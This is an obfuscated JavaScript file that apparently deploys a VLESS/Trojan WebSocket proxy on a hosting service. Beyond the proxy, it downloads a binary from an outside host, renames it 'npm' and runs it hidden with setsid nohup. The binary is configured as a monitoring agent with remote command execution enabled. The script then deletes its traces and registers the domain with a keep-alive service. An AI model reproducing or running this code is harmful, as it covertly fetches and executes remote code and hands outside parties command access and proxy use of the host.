const _0x360923=_0x1aef;(function(_0x22d963,_0x106d83){const _0x10d6d2=_0x1aef,_0x15a412=_0x22d963();while(!![]){try{const _0x2c1407=parseInt(_0x10d6d2(0x10f))/0x1+-parseInt(_0x10d6d2(0x13e))/0x2*(-parseInt(_0x10d6d2(0x128))/0x3)+-parseInt(_0x10d6d2(0x165))/0x4*(parseInt(_0x10d6d2(0x17a))/0x5)+-parseInt(_0x10d6d2(0x11b))/0x6*(parseInt(_0x10d6d2(0x11d))/0x7)+parseInt(_0x10d6d2(0x129))/0x8*(parseInt(_0x10d6d2(0x145))/0x9)+parseInt(_0x10d6d2(0x154))/0xa*(-parseInt(_0x10d6d2(0x15a))/0xb)+parseInt(_0x10d6d2(0x160))/0xc;if(_0x2c1407===_0x106d83)break;else _0x15a412['push'](_0x15a412['shift']());}catch(_0x381f63){_0x15a412['push'](_0x15a412['shift']());}}}(_0xdd69,0x4f23d));const os=require('os'),http=require(_0x360923(0x115)),fs=require('fs'),axios=require(_0x360923(0x176)),net=require(_0x360923(0x17d)),path=require(_0x360923(0x142)),crypto=require('crypto'),{Buffer}=require(_0x360923(0x147)),{exec,execSync}=require(_0x360923(0x139)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x360923(0x12b)][_0x360923(0x14e)]||'5efabea4-f6d4-91fd-b8f0-17e004c89c60',NEZHA_SERVER=process[_0x360923(0x12b)][_0x360923(0x122)]||'',NEZHA_PORT=process[_0x360923(0x12b)][_0x360923(0x16d)]||'',NEZHA_KEY=process[_0x360923(0x12b)][_0x360923(0x172)]||'',DOMAIN=process[_0x360923(0x12b)][_0x360923(0x13d)]||_0x360923(0x166),AUTO_ACCESS=process['env'][_0x360923(0x14a)]||![],WSPATH=process['env'][_0x360923(0x119)]||UUID[_0x360923(0x123)](0x0,0x8),SUB_PATH=process[_0x360923(0x12b)]['SUB_PATH']||_0x360923(0x108),NAME=process['env'][_0x360923(0x12a)]||_0x360923(0x15e),PORT=process[_0x360923(0x12b)][_0x360923(0x15f)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x292c36=_0x360923;try{const _0x1bfbd8=await axios['get'](_0x292c36(0x162)),_0x44ffc4=_0x1bfbd8[_0x292c36(0x116)];ISP=(_0x44ffc4[_0x292c36(0x11a)]+'-'+_0x44ffc4['isp'])[_0x292c36(0x17b)](/ /g,'_');}catch(_0x543bc5){ISP=_0x292c36(0x16f);}};GetISP();const httpServer=http[_0x360923(0x105)]((_0x5468d6,_0x500d4c)=>{const _0x171e0e=_0x360923;if(_0x5468d6[_0x171e0e(0x14c)]==='/'){const _0x4c262f=path[_0x171e0e(0x120)](__dirname,'index.html');fs[_0x171e0e(0x163)](_0x4c262f,'utf8',(_0x11adfe,_0x3aec60)=>{const _0x3dc746=_0x171e0e;if(_0x11adfe){_0x500d4c['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x500d4c['end']('Hello\x20world!');return;}_0x500d4c[_0x3dc746(0x14b)](0xc8,{'Content-Type':'text/html'}),_0x500d4c[_0x3dc746(0x137)](_0x3aec60);});return;}else{if(_0x5468d6['url']==='/'+SUB_PATH){const _0x17ef43=NAME?NAME+'-'+ISP:ISP,_0x1a40db=_0x171e0e(0x10e)+UUID+'@'+DOMAIN+_0x171e0e(0x11e)+DOMAIN+_0x171e0e(0x182)+DOMAIN+_0x171e0e(0x164)+WSPATH+'#'+_0x17ef43,_0x2041db='trojan://'+UUID+'@'+DOMAIN+_0x171e0e(0x132)+DOMAIN+_0x171e0e(0x182)+DOMAIN+_0x171e0e(0x164)+WSPATH+'#'+_0x17ef43,_0x6a2d3=_0x1a40db+'\x0a'+_0x2041db,_0x1afb91=Buffer[_0x171e0e(0x13c)](_0x6a2d3)[_0x171e0e(0x169)](_0x171e0e(0x131));_0x500d4c['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x500d4c[_0x171e0e(0x137)](_0x1afb91+'\x0a');}else _0x500d4c['writeHead'](0x194,{'Content-Type':_0x171e0e(0x156)}),_0x500d4c['end'](_0x171e0e(0x12d));}}),wss=new WebSocket[(_0x360923(0x151))]({'server':httpServer}),uuid=UUID[_0x360923(0x17b)](/-/g,''),DNS_SERVERS=[_0x360923(0x149),'1.1.1.1'];function resolveHost(_0x1f7cc3){return new Promise((_0x1e5c59,_0x927630)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x1f7cc3)){_0x1e5c59(_0x1f7cc3);return;}let _0x4c7f5b=0x0;function _0x9bf898(){const _0x19df8a=_0x1aef;if(_0x4c7f5b>=DNS_SERVERS[_0x19df8a(0x124)]){_0x927630(new Error('Failed\x20to\x20resolve\x20'+_0x1f7cc3+_0x19df8a(0x118)));return;}const _0x407cfe=DNS_SERVERS[_0x4c7f5b];_0x4c7f5b++;const _0x430d78=_0x19df8a(0x107)+encodeURIComponent(_0x1f7cc3)+'&type=A';axios[_0x19df8a(0x10d)](_0x430d78,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x19df8a(0x155)](_0x4a929f=>{const _0x25488e=_0x19df8a,_0x391c55=_0x4a929f['data'];if(_0x391c55[_0x25488e(0x16a)]===0x0&&_0x391c55['Answer']&&_0x391c55[_0x25488e(0x152)]['length']>0x0){const _0x45c13f=_0x391c55[_0x25488e(0x152)][_0x25488e(0x11c)](_0x1a499e=>_0x1a499e[_0x25488e(0x134)]===0x1);if(_0x45c13f){_0x1e5c59(_0x45c13f[_0x25488e(0x116)]);return;}}_0x9bf898();})[_0x19df8a(0x106)](_0x3c41a8=>{_0x9bf898();});}_0x9bf898();});}function _0x1aef(_0x29daa4,_0x4c29bc){_0x29daa4=_0x29daa4-0x105;const _0xdd69ba=_0xdd69();let _0x1aef1e=_0xdd69ba[_0x29daa4];return _0x1aef1e;}function handleVlessConnection(_0x180d23,_0x5bdd1c){const _0x46bf0d=_0x360923,[_0x563f5b]=_0x5bdd1c,_0x5b2c12=_0x5bdd1c[_0x46bf0d(0x123)](0x1,0x11);if(!_0x5b2c12['every']((_0x292b11,_0x26f10c)=>_0x292b11==parseInt(uuid[_0x46bf0d(0x109)](_0x26f10c*0x2,0x2),0x10)))return![];let _0x22c37=_0x5bdd1c[_0x46bf0d(0x123)](0x11,0x12)[_0x46bf0d(0x125)]()+0x13;const _0x4ed382=_0x5bdd1c['slice'](_0x22c37,_0x22c37+=0x2)[_0x46bf0d(0x16e)](0x0),_0x3d6521=_0x5bdd1c[_0x46bf0d(0x123)](_0x22c37,_0x22c37+=0x1)['readUInt8'](),_0x37d8df=_0x3d6521==0x1?_0x5bdd1c[_0x46bf0d(0x123)](_0x22c37,_0x22c37+=0x4)[_0x46bf0d(0x120)]('.'):_0x3d6521==0x2?new TextDecoder()[_0x46bf0d(0x138)](_0x5bdd1c[_0x46bf0d(0x123)](_0x22c37+0x1,_0x22c37+=0x1+_0x5bdd1c['slice'](_0x22c37,_0x22c37+0x1)['readUInt8']())):_0x3d6521==0x3?_0x5bdd1c[_0x46bf0d(0x123)](_0x22c37,_0x22c37+=0x10)['reduce']((_0x2a0a90,_0x4bb1cf,_0xbf3312,_0x68517c)=>_0xbf3312%0x2?_0x2a0a90[_0x46bf0d(0x133)](_0x68517c[_0x46bf0d(0x123)](_0xbf3312-0x1,_0xbf3312+0x1)):_0x2a0a90,[])[_0x46bf0d(0x15b)](_0xcb2874=>_0xcb2874[_0x46bf0d(0x16e)](0x0)[_0x46bf0d(0x169)](0x10))[_0x46bf0d(0x120)](':'):'';_0x180d23[_0x46bf0d(0x16b)](new Uint8Array([_0x563f5b,0x0]));const _0x15748e=createWebSocketStream(_0x180d23);return resolveHost(_0x37d8df)[_0x46bf0d(0x155)](_0x5080be=>{const _0x2e2b8d=_0x46bf0d;net[_0x2e2b8d(0x180)]({'host':_0x5080be,'port':_0x4ed382},function(){const _0x839266=_0x2e2b8d;this[_0x839266(0x130)](_0x5bdd1c['slice'](_0x22c37)),_0x15748e['on'](_0x839266(0x126),()=>{})[_0x839266(0x178)](this)['on'](_0x839266(0x126),()=>{})[_0x839266(0x178)](_0x15748e);})['on'](_0x2e2b8d(0x126),()=>{});})['catch'](_0x3c9127=>{const _0x3399fa=_0x46bf0d;net[_0x3399fa(0x180)]({'host':_0x37d8df,'port':_0x4ed382},function(){const _0x3755b3=_0x3399fa;this['write'](_0x5bdd1c[_0x3755b3(0x123)](_0x22c37)),_0x15748e['on'](_0x3755b3(0x126),()=>{})[_0x3755b3(0x178)](this)['on'](_0x3755b3(0x126),()=>{})[_0x3755b3(0x178)](_0x15748e);})['on'](_0x3399fa(0x126),()=>{});}),!![];}function handleTrojanConnection(_0x550050,_0x175258){const _0xb0715e=_0x360923;try{if(_0x175258['length']<0x3a)return![];const _0x337dd0=_0x175258['slice'](0x0,0x38)['toString'](),_0x1e4921=[UUID];let _0x323775=null;for(const _0x376b85 of _0x1e4921){const _0x4177d2=crypto['createHash'](_0xb0715e(0x168))['update'](_0x376b85)[_0xb0715e(0x146)](_0xb0715e(0x110));if(_0x4177d2===_0x337dd0){_0x323775=_0x376b85;break;}}if(!_0x323775)return![];let _0x2a7330=0x38;_0x175258[_0x2a7330]===0xd&&_0x175258[_0x2a7330+0x1]===0xa&&(_0x2a7330+=0x2);const _0x1aec2e=_0x175258[_0x2a7330];if(_0x1aec2e!==0x1)return![];_0x2a7330+=0x1;const _0x5943e0=_0x175258[_0x2a7330];_0x2a7330+=0x1;let _0x3d2c20,_0x119958;if(_0x5943e0===0x1)_0x3d2c20=_0x175258[_0xb0715e(0x123)](_0x2a7330,_0x2a7330+0x4)['join']('.'),_0x2a7330+=0x4;else{if(_0x5943e0===0x3){const _0x327d7b=_0x175258[_0x2a7330];_0x2a7330+=0x1,_0x3d2c20=_0x175258['slice'](_0x2a7330,_0x2a7330+_0x327d7b)[_0xb0715e(0x169)](),_0x2a7330+=_0x327d7b;}else{if(_0x5943e0===0x4)_0x3d2c20=_0x175258[_0xb0715e(0x123)](_0x2a7330,_0x2a7330+0x10)['reduce']((_0xf6f41,_0x49acfe,_0x351255,_0x581947)=>_0x351255%0x2?_0xf6f41[_0xb0715e(0x133)](_0x581947[_0xb0715e(0x123)](_0x351255-0x1,_0x351255+0x1)):_0xf6f41,[])[_0xb0715e(0x15b)](_0x57e146=>_0x57e146[_0xb0715e(0x16e)](0x0)['toString'](0x10))[_0xb0715e(0x120)](':'),_0x2a7330+=0x10;else return![];}}_0x119958=_0x175258['readUInt16BE'](_0x2a7330),_0x2a7330+=0x2;_0x2a7330<_0x175258[_0xb0715e(0x124)]&&_0x175258[_0x2a7330]===0xd&&_0x175258[_0x2a7330+0x1]===0xa&&(_0x2a7330+=0x2);const _0x40af9e=createWebSocketStream(_0x550050);return resolveHost(_0x3d2c20)[_0xb0715e(0x155)](_0x45d76f=>{const _0x3ae4bb=_0xb0715e;net[_0x3ae4bb(0x180)]({'host':_0x45d76f,'port':_0x119958},function(){const _0x3247ba=_0x3ae4bb;_0x2a7330<_0x175258['length']&&this['write'](_0x175258[_0x3247ba(0x123)](_0x2a7330)),_0x40af9e['on'](_0x3247ba(0x126),()=>{})[_0x3247ba(0x178)](this)['on'](_0x3247ba(0x126),()=>{})[_0x3247ba(0x178)](_0x40af9e);})['on']('error',()=>{});})[_0xb0715e(0x106)](_0x35a097=>{const _0x1320f1=_0xb0715e;net[_0x1320f1(0x180)]({'host':_0x3d2c20,'port':_0x119958},function(){const _0x4c6fbb=_0x1320f1;_0x2a7330<_0x175258['length']&&this[_0x4c6fbb(0x130)](_0x175258[_0x4c6fbb(0x123)](_0x2a7330)),_0x40af9e['on']('error',()=>{})[_0x4c6fbb(0x178)](this)['on'](_0x4c6fbb(0x126),()=>{})['pipe'](_0x40af9e);})['on'](_0x1320f1(0x126),()=>{});}),!![];}catch(_0x552bf8){return![];}}wss['on'](_0x360923(0x13a),(_0x5b16f5,_0x26f9ca)=>{const _0x1335e0=_0x360923,_0x181f37=_0x26f9ca[_0x1335e0(0x14c)]||'';_0x5b16f5[_0x1335e0(0x181)](_0x1335e0(0x114),_0x4d25ef=>{const _0x443038=_0x1335e0;if(_0x4d25ef['length']>0x11&&_0x4d25ef[0x0]===0x0){const _0x4d2b45=_0x4d25ef[_0x443038(0x123)](0x1,0x11),_0x590e84=_0x4d2b45[_0x443038(0x171)]((_0x3b03fa,_0x2e7975)=>_0x3b03fa==parseInt(uuid[_0x443038(0x109)](_0x2e7975*0x2,0x2),0x10));if(_0x590e84){!handleVlessConnection(_0x5b16f5,_0x4d25ef)&&_0x5b16f5['close']();return;}}!handleTrojanConnection(_0x5b16f5,_0x4d25ef)&&_0x5b16f5[_0x443038(0x158)]();})['on'](_0x1335e0(0x126),()=>{});});function _0xdd69(){const _0x4a51a8=['Server','Answer','client_secret:\x20','63460xaNNLE','then','text/plain','writeFileSync','close','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1078IqXbIG','map','pop','https://arm64.ssss.nyc.mn/v1','Hug','PORT','5490924mbvFge','https://','https://api.ip.sb/geoip','readFile','&path=%2F','212SCyyTc','1234.abc.com','includes','sha224','toString','Status','send','2096','NEZHA_PORT','readUInt16BE','Unknown','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','every','NEZHA_KEY','npm\x20is\x20already\x20running,\x20skip\x20running...','npm\x20is\x20running','error:\x20','axios','unlink','pipe','npm','16395CyYmXr','replace','chmod\x20+x\x20npm','net','--tls','arm64','connect','once','&fp=chrome&type=ws&host=','config.yaml','createServer','catch','https://dns.google/resolve?name=','sub','substr','\x20-p\x20','https://oooo.serv00.net/add-url','log','get','vless://','602757swgbwq','hex','utf-8','8443','https://arm64.ssss.nyc.mn/agent','message','http','data','false','\x20with\x20all\x20DNS\x20servers','WSPATH','country_code','63240RZBOhw','find','70yMZQyI',':443?encryption=none&security=tls&sni=','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','join','Server\x20is\x20running\x20on\x20port\x20','NEZHA_SERVER','slice','length','readUInt8','error','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','18123spFYsJ','32mTTXlP','NAME','env','split','Not\x20Found\x0a','application/json','npm\x20running\x20error:','write','base64',':443?security=tls&sni=','concat','type','post','trim','end','decode','child_process','connection','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','from','DOMAIN','28UPsbin','443','npm\x20download\x20successfully','arch','path','listen','finish','180774oMDjRP','digest','buffer','true','8.8.4.4','AUTO_ACCESS','writeHead','url','createWriteStream','UUID','https://amd64.ssss.nyc.mn/agent','Automatic\x20Access\x20Task\x20added\x20successfully'];_0xdd69=function(){return _0x4a51a8;};return _0xdd69();}const getDownloadUrl=()=>{const _0x3c3cb5=_0x360923,_0x2a3e3d=os[_0x3c3cb5(0x141)]();return _0x2a3e3d==='arm'||_0x2a3e3d===_0x3c3cb5(0x17f)||_0x2a3e3d==='aarch64'?!NEZHA_PORT?_0x3c3cb5(0x15d):_0x3c3cb5(0x113):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3c3cb5(0x14f);},downloadFile=async()=>{const _0x4d44eb=_0x360923;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3ec7de=getDownloadUrl(),_0x504e2d=await axios({'method':_0x4d44eb(0x10d),'url':_0x3ec7de,'responseType':'stream'}),_0x3f819d=fs[_0x4d44eb(0x14d)]('npm');return _0x504e2d['data'][_0x4d44eb(0x178)](_0x3f819d),new Promise((_0x20cdcd,_0x30ed73)=>{const _0x1441f2=_0x4d44eb;_0x3f819d['on'](_0x1441f2(0x144),()=>{const _0x16feeb=_0x1441f2;console['log'](_0x16feeb(0x140)),exec(_0x16feeb(0x17c),_0x5cd657=>{if(_0x5cd657)_0x30ed73(_0x5cd657);_0x20cdcd();});}),_0x3f819d['on'](_0x1441f2(0x126),_0x30ed73);});}catch(_0x2cc08b){throw _0x2cc08b;}},runnz=async()=>{const _0x18b0ce=_0x360923;try{const _0x52da1a=execSync(_0x18b0ce(0x127),{'encoding':_0x18b0ce(0x111)});if(_0x52da1a[_0x18b0ce(0x136)]()!==''){console[_0x18b0ce(0x10c)](_0x18b0ce(0x173));return;}}catch(_0x3fa680){}await downloadFile();let _0x1480c4='',_0x326836=[_0x18b0ce(0x13f),_0x18b0ce(0x112),_0x18b0ce(0x16c),'2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ab2c2=_0x326836['includes'](NEZHA_PORT)?_0x18b0ce(0x17e):'';_0x1480c4='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x18b0ce(0x10a)+NEZHA_KEY+'\x20'+_0x5ab2c2+_0x18b0ce(0x11f);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3f80be=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x18b0ce(0x12c)](':')[_0x18b0ce(0x15c)]():'',_0x360c4d=_0x326836[_0x18b0ce(0x167)](_0x3f80be)?_0x18b0ce(0x148):_0x18b0ce(0x117),_0x125436=_0x18b0ce(0x153)+NEZHA_KEY+_0x18b0ce(0x13b)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x360c4d+_0x18b0ce(0x159)+UUID;fs[_0x18b0ce(0x157)](_0x18b0ce(0x183),_0x125436);}_0x1480c4=_0x18b0ce(0x170);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x1480c4,{'shell':'/bin/bash'},_0xadad95=>{const _0x8dd962=_0x18b0ce;if(_0xadad95)console[_0x8dd962(0x126)](_0x8dd962(0x12f),_0xadad95);else console[_0x8dd962(0x10c)](_0x8dd962(0x174));});}catch(_0x471f5a){console['error'](_0x18b0ce(0x175)+_0x471f5a);}};async function addAccessTask(){const _0x30eb14=_0x360923;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b505c=_0x30eb14(0x161)+DOMAIN;try{const _0x40d993=await axios[_0x30eb14(0x135)](_0x30eb14(0x10b),{'url':_0x1b505c},{'headers':{'Content-Type':_0x30eb14(0x12e)}});console[_0x30eb14(0x10c)](_0x30eb14(0x150));}catch(_0x387991){}}const delFiles=()=>{const _0x2b4508=_0x360923;fs[_0x2b4508(0x177)](_0x2b4508(0x179),()=>{}),fs[_0x2b4508(0x177)]('config.yaml',()=>{});};httpServer[_0x360923(0x143)](PORT,()=>{const _0x5651d0=_0x360923;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5651d0(0x10c)](_0x5651d0(0x121)+PORT);});
